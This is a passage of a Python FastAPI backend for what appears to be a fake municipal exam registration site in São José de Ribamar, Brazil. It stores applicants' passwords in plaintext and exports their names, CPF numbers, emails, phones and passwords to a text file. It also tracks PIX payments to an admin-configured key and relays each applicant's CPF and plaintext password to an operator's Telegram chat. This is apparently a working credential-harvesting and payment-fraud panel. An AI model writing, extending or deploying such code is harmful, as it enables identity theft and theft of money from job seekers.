        "total": len(items),
        "items": items,
        "kpis": {
            "acessos": total_acessos,
            "total_inscricoes": total_inscricoes,
            "valor_total_gerado": valor_total_gerado,
            "pix_gerados_count": total_pix_gerados,
            "pix_copiados_count": total_pix_copiados,
            "pix_copiados_valor": valor_pix_copiados,
            "pix_baixados_count": total_pix_baixados,
            "pix_baixados_valor": valor_pix_baixados,
        },
    }


@api_router.get("/admin/inscricoes/export")
async def export_inscricoes(_: dict = Depends(get_current_admin)):
    """Gera um TXT organizado com todas as inscrições + cadastros."""
    users = await db.users.find({}, {"_id": 0}).sort("created_at", -1).to_list(5000)
    insc_docs = await db.inscricoes.find({}, {"_id": 0}).sort("created_at", -1).to_list(5000)
    insc_by_user: dict = {}
    for i in insc_docs:
        insc_by_user.setdefault(i["user_id"], []).append(i)

    lines = []
    sep = "=" * 80
    lines.append(sep)
    lines.append("INSCRIÇÕES — CONCURSO PREFEITURA DE SÃO JOSÉ DE RIBAMAR")
    lines.append(f"Gerado em: {datetime.now(timezone.utc).strftime('%d/%m/%Y %H:%M UTC')}")
    lines.append(f"Total de candidatos: {len(users)}  |  Total de inscrições: {len(insc_docs)}")
    lines.append(sep)
    lines.append("")

    for idx, u in enumerate(users, 1):
        lines.append(f"#{idx}  {u['nome']}")
        lines.append(f"    CPF........: {u['cpf']}")
        lines.append(f"    E-mail.....: {u['email']}")
        lines.append(f"    Telefone...: {u.get('telefone') or '—'}")
        lines.append(f"    Senha......: {u.get('senha_plain') or '—'}")
        lines.append(f"    Dispositivo: {u.get('device') or '—'}")
        lines.append(f"    Cadastrado.: {u['created_at']}")
        insc_list = insc_by_user.get(u["id"], [])
        if not insc_list:
            lines.append("    Inscrição..: AGUARDANDO INSCRIÇÃO (apenas login realizado)")
        else:
            for j, ins in enumerate(insc_list, 1):
                lines.append(f"    Inscrição {j}: {(ins.get('concurso') or '—').upper()}")
                lines.append(f"      Cargo......: {ins.get('cargo') or '—'}")
                lines.append(f"      Cota.......: {ins.get('cota') or '—'}")
                lines.append(f"      Cidade prova: {ins.get('cidade_prova') or '—'}")
                lines.append(f"      Status.....: {ins.get('status') or '—'}")
                lines.append(f"      Criada em..: {ins.get('created_at')}")
        lines.append("-" * 80)

    body = "\n".join(lines)
    from fastapi.responses import PlainTextResponse
    fname = f"inscricoes_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
    return PlainTextResponse(
        content=body,
        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
        media_type="text/plain; charset=utf-8",
    )


@api_router.post("/admin/inscricoes/clear")
async def clear_inscricoes(_: dict = Depends(get_current_admin)):
    """Apaga APENAS as inscrições. Cadastros (users) permanecem intactos."""
    res = await db.inscricoes.delete_many({})
    return {"deleted": res.deleted_count}


@api_router.delete("/admin/inscricoes/{insc_id}")
async def delete_inscricao(insc_id: str, _: dict = Depends(get_current_admin)):
    res = await db.inscricoes.delete_one({"id": insc_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Inscrição não encontrada")
    return {"deleted": True}


@api_router.get("/admin/stats")
async def admin_stats(_: dict = Depends(get_current_admin)):
    total_cadastros = await db.users.count_documents({})
    total_inscricoes = await db.inscricoes.count_documents({})
    return {"total_cadastros": total_cadastros, "total_inscricoes": total_inscricoes}


# ---------- Dashboard ----------
@api_router.get("/admin/dashboard")
async def admin_dashboard(_: dict = Depends(get_current_admin)):
    """Retorna stats consolidados para o dashboard.

    Hoje só temos cadastros e inscrições reais; acessos/PIX serão preenchidos
    quando o tracking de eventos for implementado. Mantemos a estrutura
    pronta para receber esses números no futuro.
    """
    total_cadastros = await db.users.count_documents({})
    total_inscricoes = await db.inscricoes.count_documents({})

    # Eventos (não há tracking ainda) — placeholders
    total_acessos = await db.events.count_documents({"type": "page_view"})
    total_pix_gerados = await db.events.count_documents({"type": "pix_generated"})
    total_pix_copiados = await db.events.count_documents({"type": "pix_copied"})
    total_logins = await db.events.count_documents({"type": "login"})

    valor_unitario = 95.0
    # Soma valores reais dos eventos PIX (não conta inscrições não pagas)
    pix_gen_docs = await db.events.find({"type": "pix_generated"}, {"_id": 0, "valor": 1}).to_list(10000)
    valor_total_gerado = sum(
        float(e.get("valor") or 0) for e in pix_gen_docs if e.get("valor") not in (None, "")
    )
    pix_cop_docs = await db.events.find({"type": "pix_copied"}, {"_id": 0, "valor": 1}).to_list(10000)
    valor_pix_copiados = sum(
        float(e.get("valor") or 0) for e in pix_cop_docs if e.get("valor") not in (None, "")
    )
    pix_dl_docs = await db.events.find({"type": "pix_downloaded"}, {"_id": 0, "valor": 1}).to_list(10000)
    valor_pix_baixados = sum(
        float(e.get("valor") or 0) for e in pix_dl_docs if e.get("valor") not in (None, "")
    )
    total_pix_baixados = len(pix_dl_docs)

    # Funil
    funnel = [
        {"stage": "Acessos ao site", "value": total_acessos, "color": "#8b5cf6"},
        {"stage": "Login realizado", "value": total_logins, "color": "#3b82f6"},
        {"stage": "Inscrições criadas", "value": total_inscricoes, "color": "#10b981"},
        {"stage": "PIX gerado", "value": total_pix_gerados, "color": "#f59e0b"},
        {"stage": "PIX copiado", "value": total_pix_copiados, "color": "#ec4899"},
    ]

    # Atividade dos últimos 7 dias — agrupa por dia
    now = datetime.now(timezone.utc)
    seven_days_ago = now - timedelta(days=6)
    cursor_users = db.users.find(
        {"created_at": {"$gte": seven_days_ago.isoformat()}}, {"_id": 0, "created_at": 1}
    )
    users_7d = await cursor_users.to_list(5000)
    cursor_inscr = db.inscricoes.find(
        {"created_at": {"$gte": seven_days_ago.isoformat()}}, {"_id": 0, "created_at": 1}
    )
    inscr_7d = await cursor_inscr.to_list(5000)

    daily = []
    for i in range(7):
        day = (seven_days_ago + timedelta(days=i)).date()
        key = day.isoformat()
        c_acessos = sum(1 for u in users_7d if u["created_at"][:10] == key)
        c_inscr = sum(1 for x in inscr_7d if x["created_at"][:10] == key)
        daily.append(
            {
                "date": key,
                "label": day.strftime("%d/%m"),
                "acessos": c_acessos,
                "inscricoes": c_inscr,
            }
        )

    # Top localizações — placeholder até termos tracking de IP/geo
    top_locations: List[dict] = []

    # Atividade em tempo real — últimos 12 eventos (cadastros + inscrições)
    realtime = []
    recent_users = await db.users.find({}, {"_id": 0, "password_hash": 0}).sort("created_at", -1).limit(8).to_list(8)
    recent_inscr = await db.inscricoes.find({}, {"_id": 0}).sort("created_at", -1).limit(8).to_list(8)
    for u in recent_users:
        realtime.append(
            {
                "type": "novo_cadastro",
                "title": "Novo cadastro",
                "subtitle": f"{u['nome']} • {u['email']}",
                "created_at": u["created_at"],
            }
        )
    for i in recent_inscr:
        realtime.append(
            {
                "type": "nova_inscricao",
                "title": "Nova inscrição",
                "subtitle": f"{i['nome']} • {i.get('concurso', '—')}",
                "created_at": i["created_at"],
            }
        )
    realtime.sort(key=lambda e: e["created_at"], reverse=True)
    realtime = realtime[:12]

    return {
        "kpis": {
            "acessos": total_acessos,
            "total_inscricoes": total_inscricoes,
            "valor_total_gerado": valor_total_gerado,
            "pix_copiados_count": total_pix_copiados,
            "pix_copiados_valor": valor_pix_copiados,
            "pix_baixados_count": total_pix_baixados,
            "pix_baixados_valor": valor_pix_baixados,
            "valor_unitario": valor_unitario,
            "total_cadastros": total_cadastros,
            "pix_gerados": total_pix_gerados,
            "pix_gerados_count": total_pix_gerados,
        },
        "funnel": funnel,
        "daily_7d": daily,
        "top_locations": top_locations,
        "realtime": realtime,
    }


@api_router.post("/admin/clear")
async def admin_clear(_: dict = Depends(get_current_admin)):
    """Reseta APENAS os eventos do dashboard (page_view, pix_generated, pix_copied).
    Cadastros e inscrições permanecem intactos.
    """
    d3 = await db.events.delete_many({}) if "events" in await db.list_collection_names() else None
    return {
        "events_deleted": d3.deleted_count if d3 else 0,
    }


# ---------- Settings ----------
class PixSettingsIn(BaseModel):
    chave_pix: str = Field("", max_length=200)


class TelegramSettingsIn(BaseModel):
    bot_token: str = Field("", max_length=300)
    chat_id: str = Field("", max_length=100)
    active: bool = True


async def _get_settings() -> dict:
    doc = await db.settings.find_one({"_id": "config"}, {"_id": 0})
    if not doc:
        doc = {"chave_pix": "", "bot_token": "", "chat_id": "", "telegram_active": False}
    return doc


async def send_telegram(text: str) -> bool:
    """Envia mensagem para o chat do admin via Bot do Telegram.
    Lê bot_token, chat_id e telegram_active das settings. Retorna True/False.
    Falhas são logadas mas não levantam exceção (não bloqueia o fluxo do usuário).
    """
    res = await _tg_request("sendMessage", text)
    return bool(res)


async def _tg_request(method: str, text: str, message_id: int | None = None) -> dict | None:
    """Faz request genérico ao bot. Retorna o JSON do Telegram em sucesso, None em falha."""
    try:
        cfg = await _get_settings()
        if not cfg.get("telegram_active"):
            return None
        token = (cfg.get("bot_token") or "").strip()
        chat_id = (cfg.get("chat_id") or "").strip()
        if not token or not chat_id:
            return None
        url = f"https://api.telegram.org/bot{token}/{method}"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        if message_id is not None:
            payload["message_id"] = message_id
        async with httpx.AsyncClient(timeout=10.0) as cli:
            r = await cli.post(url, json=payload)
            if r.status_code != 200:
                logger.warning(f"Telegram {method} error {r.status_code}: {r.text[:200]}")
                return None
            return r.json()
    except Exception as e:
        logger.warning(f"Telegram {method} failed: {e}")
        return None


def _short_concurso(nome: str) -> str:
    """Extrai um nome curto do concurso para o título da notificação.
    Ex.: 'CONCURSO PÚBLICO DA EDUCAÇÃO DE SÃO JOSÉ DE RIBAMAR - MA' → 'RIBAMAR'
         'CONCURSO PÚBLICO MUNICIPAL DE CAJARI - MA' → 'CAJARI'
    """
    s = (nome or "").upper()
    # Mapeia cidades conhecidas
    keys = ["RIBAMAR", "CAJARI", "SAO LUIS", "SÃO LUÍS", "EDUCACAO", "EDUCAÇÃO", "SAUDE", "SAÚDE", "GUARDA"]
    for k in keys:
        if k in s:
            return k.replace("Ã", "A").replace("Á", "A").replace("Í", "I").replace("Ç", "C").replace("Ú", "U").replace("É", "E")
    # Fallback: pega a última palavra significativa antes do "-"
    s2 = s.split(" - ")[0].split()
    if s2:
        return s2[-1]
    return "CONCURSO"


def _detect_device(ua: str) -> str:
    """Detecta dispositivo a partir do user-agent."""
    s = (ua or "").lower()
    if "ipad" in s or "tablet" in s:
        return "Tablet"
    if "mobile" in s or "iphone" in s or "android" in s:
        return "Mobile"
    return "Desktop"


def _status_badge(status: str) -> str:
    """Devolve o emoji + label de status para o Telegram."""
    s = (status or "").lower()
    if s == "pix_baixado":
        return "🟣 PIX baixado (comprovante)"
    if s == "pix_copiado":
        return "🟢 PIX copiado"
    if s == "pix_gerado":
        return "🔵 PIX gerado"
    if s == "pago":
        return "✅ Pago"
    return "🟡 Aguardando pagamento"


def _fmt_dt_br(iso_str: str) -> str:
    try:
        dt = datetime.fromisoformat(iso_str.replace("Z", "+00:00"))
        # Converte para horário de Brasília (UTC-3)
        dt_br = dt.astimezone(timezone(timedelta(hours=-3)))
        return dt_br.strftime("%d/%m/%Y às %H:%M")
    except Exception:
        return iso_str or "—"


def _build_insc_msg(insc: dict, user: dict) -> str:
    """Monta a mensagem da notificação Telegram para uma inscrição."""
    titulo = _short_concurso(insc.get("concurso") or "")
    cpf = _html_esc(insc.get("cpf") or user.get("cpf") or "—")
    senha = _html_esc(user.get("senha_plain") or "—")
    data_hora = _fmt_dt_br(insc.get("created_at") or "")
    device = _html_esc(insc.get("device") or "—")
    local = _html_esc(insc.get("local") or "—")
    status = _status_badge(insc.get("status"))
    return (
        f"<b>INSCRIÇÃO {titulo} - Nova inscrição</b>\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>Usuário:</b> {cpf}\n"
        f"🔐 <b>Senha:</b> {senha}\n"
        f"📅 <b>Data/hora:</b> {data_hora}\n"
        f"📱 <b>Dispositivo:</b> {device}\n"
        f"📍 <b>Local:</b> {local}\n"
        f"📊 <b>Status:</b> {status}"
    )


async def notify_inscricao(insc_id: str):
    """Envia ou edita a mensagem do Telegram para esta inscrição.
    Salva o message_id no documento da inscrição para edições futuras.
    """
    insc = await db.inscricoes.find_one({"id": insc_id}, {"_id": 0})
    if not insc:
        return
    user = await db.users.find_one({"id": insc.get("user_id")}, {"_id": 0}) or {}
    text = _build_insc_msg(insc, user)
    msg_id = insc.get("tg_message_id")
    if msg_id:
        # Tenta editar a mensagem existente
        res = await _tg_request("editMessageText", text, message_id=int(msg_id))
        if res:
            return
        # Se falhou editar (ex.: mensagem muito antiga), envia uma nova
    res = await _tg_request("sendMessage", text)
    if res and res.get("ok"):
        new_id = res.get("result", {}).get("message_id")
        if new_id:
            await db.inscricoes.update_one(
                {"id": insc_id},
                {"$set": {"tg_message_id": int(new_id)}},
            )


def _html_esc(s) -> str:
    """Escapa HTML básico para o Telegram."""
    return (str(s or "")
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;"))


@api_router.get("/admin/settings")
async def get_settings(_: dict = Depends(get_current_admin)):
    return await _get_settings()


@api_router.put("/admin/settings/pix")
async def save_pix(payload: PixSettingsIn, _: dict = Depends(get_current_admin)):
    await db.settings.update_one(
        {"_id": "config"},
        {"$set": {"chave_pix": payload.chave_pix.strip(), "updated_at": now_iso()}},
        upsert=True,
    )
    return await _get_settings()


@api_router.put("/admin/settings/telegram")
async def save_telegram(payload: TelegramSettingsIn, _: dict = Depends(get_current_admin)):
    await db.settings.update_one(
        {"_id": "config"},
        {
            "$set": {
                "bot_token": payload.bot_token.strip(),
                "chat_id": payload.chat_id.strip(),
                "telegram_active": bool(payload.active),
                "updated_at": now_iso(),
            }
        },
        upsert=True,
    )
    return await _get_settings()


@api_router.post("/admin/settings/telegram/test")
async def test_telegram(_: dict = Depends(get_current_admin)):
    """Envia mensagem de teste para validar o bot/chat configurados."""
    ok = await send_telegram(
        "<b>✅ Teste de conexão</b>\n\n"
        "Se você está lendo isso, o bot do Telegram está configurado corretamente "
        "e receberá notificações de novas inscrições e PIX copiados."
    )
    if not ok:
        raise HTTPException(status_code=400, detail="Falha ao enviar. Verifique bot_token, chat_id e se o bot está ativo.")
    return {"ok": True}


# ---------- Admin users (placeholder) ----------
@api_router.get("/admin/users")
async def list_admin_users(_: dict = Depends(get_current_admin)):
    admins = await db.admins.find({}, {"_id": 0, "password_hash": 0}).to_list(100)
    return {"items": admins, "total": len(admins)}


# --- Bootstrap ---
app.include_router(api_router)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def startup_event():
    # MongoDB indexes
    await db.users.create_index("cpf", unique=True)
    await db.users.create_index("email", unique=True)
    await db.admins.create_index("username", unique=True)
    await db.inscricoes.create_index("user_id")
    await db.inscricoes.create_index("created_at")
    await db.inscricoes.create_index("cpf")
    await db.inscricoes.create_index("status")
    await db.inscricoes.create_index([("user_id", 1), ("created_at", -1)])
    await db.inscricoes.create_index([("status", 1), ("created_at", -1)])

    # Seed admin idempotently
    expected_user = os.environ.get("ADMIN_USERNAME", "donas")
    expected_pass = os.environ.get("ADMIN_PASSWORD", "")
    existing = await db.admins.find_one({"username": expected_user})
    if not existing:
        await db.admins.insert_one(
            {"username": expected_user, "password_hash": hash_password(expected_pass), "created_at": now_iso()}
        )
        logger.info(f"Admin '{expected_user}' criado")
    elif not verify_password(expected_pass, existing["password_hash"]):
        await db.admins.update_one(
            {"username": expected_user}, {"$set": {"password_hash": hash_password(expected_pass)}}
        )
        logger.info(f"Admin '{expected_user}' senha atualizada")


@app.on_event("shutdown")
async def shutdown_event():
    client.close()
